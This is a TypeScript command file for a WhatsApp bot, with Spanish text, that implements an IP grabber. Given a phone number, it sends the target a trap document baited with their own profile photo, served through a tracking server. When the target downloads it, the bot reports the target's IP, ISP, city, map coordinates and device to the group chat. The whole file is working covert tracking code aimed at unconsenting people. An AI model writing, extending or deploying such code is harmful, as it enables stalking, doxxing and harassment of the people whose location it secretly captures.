import { randomBytes } from "node:crypto";
import { readFile } from "node:fs/promises";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import {
  buildDocumentMessage,
  createSession,
  TRAP_BASE_URL,
  TRAP_TTL_MS,
  type TrapHit,
  type TrapSession,
} from "../../core/ipTrap.ts";

const FALLBACK_JPG =
  "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==";

const flagOf = (cc?: string) =>
  cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️";

function deviceOf(ua: string) {
  if (/android/i.test(ua)) return "📱 Android";
  if (/iphone|ipad|ipod|ios/i.test(ua)) return "🍎 iOS";
  if (/windows/i.test(ua)) return "🖥️ Windows";
  if (/mac os|macintosh/i.test(ua)) return "🖥️ macOS";
  if (/linux/i.test(ua)) return "🐧 Linux";
  if (/whatsapp/i.test(ua)) return "💬 Cliente WhatsApp";
  return "❔ Desconocido";
}

async function sendReport(sock: any, s: TrapSession, hit: TrapHit, idx: number) {
  const g = hit.geo;
  let localTime = "N/D";
  if (g?.tz) {
    try {
      localTime = new Intl.DateTimeFormat("es-CO", {
        timeZone: g.tz,
        dateStyle: "short",
        timeStyle: "medium",
      }).format(new Date(hit.at));
    } catch {}
  }

  const tipo = g?.proxy ? "🛡️ Proxy / VPN" : g?.mobile ? "📶 Red móvil" : g?.hosting ? "🖧 Hosting" : "🌐 Red fija / otra";

  const lines = [
    idx === 0
      ? `📡 *${fytBold("IP CAPTURADA")}*`
      : `📡 *${fytBold(`IP ADICIONAL #${idx + 1}`)}*`,
    ``,
    `╭─〔 🎯 *OBJETIVO* 〕`,
    `┃ 👤 *Nombre:* ${s.pushName}`,
    `┃ 📱 *Número:* \`+${s.targetPhone}\``,
    `┃ 🔗 *JID:* \`${s.targetJid}\``,
    `╰─────────────────────`,
    ``,
    `╭─〔 🛰️ *CONEXIÓN* 〕`,
    `┃ 🌐 *IP:* \`${hit.ip}\``,
    `┃ ${g?.countryCode ? `🏳️ *País:* ${flagOf(g.countryCode)} ${g.country ?? "?"}` : "🏳️ *País:* Desconocido"}`,
    `┃ 🗺️ *Región:* ${g?.region ?? "N/D"}`,
    `┃ 🏙️ *Ciudad:* ${g?.city ?? "N/D"}`,
    `┃ 📶 *Tipo:* ${tipo}`,
    `┃ 🏢 *ISP:* ${g?.isp ?? "N/D"}`,
    `┃ 🏛️ *Org:* ${g?.org ?? "N/D"}`,
    `┃ 🔢 *ASN:* ${g?.asn ?? "N/D"}`,
    `┃ 🕒 *TZ:* \`${g?.tz ?? "N/D"}\``,
    `┃ ⌚ *Hora local:* ${localTime}`,
    ...(g?.lat && g?.lon
      ? [`┃ 📍 *Mapa:* https://www.google.com/maps?q=${g.lat},${g.lon}`]
      : []),
    `╰─────────────────────`,
    ``,
    `╭─〔 🧾 *CLIENTE* 〕`,
    `┃ 🖥️ *Dispositivo:* ${deviceOf(hit.ua)}`,
    `┃ 🏷️ *UA:* ${hit.ua.slice(0, 160)}`,
    `┃ 🕐 *Capturado:* ${new Date(hit.at).toLocaleString("es-CO")}`,
    `╰─────────────────────`,
    ``,
    g?.proxy || g?.hosting
      ? `⚠️ IP de proxy/VPN o datacenter: la ubicación puede no ser la real.`
      : g?.mobile
        ? `ℹ️ IP de operador móvil: ciudad aproximada (NAT del carrier).`
        : `ℹ️ Geolocalización a nivel de ciudad por base de datos de IP.`,
  ];

  await sock.sendMessage(s.chatJid, { text: lines.join("\n") }).catch(() => undefined);
}

export default {
  name: ["whoisip", "ipgrab", "rastrearip"],
  category: "group",
  description: "Captura la IP del objetivo con un documento trampa y reporta la geolocalización al grupo.",
  groupOnly: false,
  async run(ctx: CommandContext) {
    const { reply, react, msg, args, sock, from } = ctx;

    if (!TRAP_BASE_URL) {
      return reply("⚠️ Falta la variable de entorno *TRAP_BASE_URL* (URL pública HTTPS de este servidor).");
    }

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    let raw = "";

    if (contextInfo?.mentionedJid?.length) raw = contextInfo.mentionedJid[0];
    else if (contextInfo?.participant) raw = contextInfo.participant;
    else if (args.length) raw = args.join("");

    const digits = raw.split("@")[0].split(":")[0].replace(/\D/g, "");
    if (!digits || digits.length < 7) {
      return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
    }

    const targetJid = `${digits}@s.whatsapp.net`;

    await react("🔎").catch(() => undefined);

    const check = await sock.onWhatsApp(targetJid).catch(() => null);
    if (!check?.[0]?.exists) {
      await react("❌").catch(() => undefined);
      return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
    }

    const pushName =
      (await sock.fetchStatus?.(targetJid).catch(() => null)) ??
      (msg as any).pushName ??
      "Desconocido";

    // Foto de perfil como cebo
    let plain: Buffer | null = null;
    try {
      const pp = await sock.profilePictureUrl(targetJid, "image");
      if (pp) {
        const r = await fetch(pp, { signal: AbortSignal.timeout(8000) });
        if (r.ok) plain = Buffer.from(await r.arrayBuffer());
      }
    } catch {}

    if (!plain) {
      try {
        plain = await readFile("assets/whoisip.jpg");
      } catch {
        plain = Buffer.from(FALLBACK_JPG, "base64");
      }
    }

    const session = createSession({
      plain,
      fileName: `foto_${digits.slice(-4)}.jpg`,
      targetJid,
      targetPhone: digits,
      chatJid: from,
      pushName: String(pushName ?? "Desconocido"),
      onHit: async (s, hit) => {
        const idx = s.hits.findIndex((h) => h.ip === hit.ip);
        await sendReport(sock, s, hit, idx < 0 ? s.hits.length : idx);
      },
      onExpire: async (s) => {
        await sock
          .sendMessage(s.chatJid, {
            text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó el archivo en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
          })
          .catch(() => undefined);
      },
    });

    const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();
    const caption =
      `🔎 *${fytBold("Análisis de red")}*\n\n` +
      `Toca *Descargar* para generar el reporte.\n` +
      `\`+${digits}\``;

    const docMsg = buildDocumentMessage(session, caption, {
      stanzaId: msg.key.id,
      participant: msg.key.participant ?? targetJid,
      remoteJid: from,
    });

    await sock.relayMessage(from, docMsg, { messageId });
    await react("📡").catch(() => undefined);
  },
};
